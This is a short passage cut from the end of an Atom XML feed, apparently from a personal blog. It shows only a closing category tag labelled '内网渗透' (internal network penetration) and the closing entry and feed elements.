      <category term="内网渗透" scheme="http://patrilic.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
</feed>
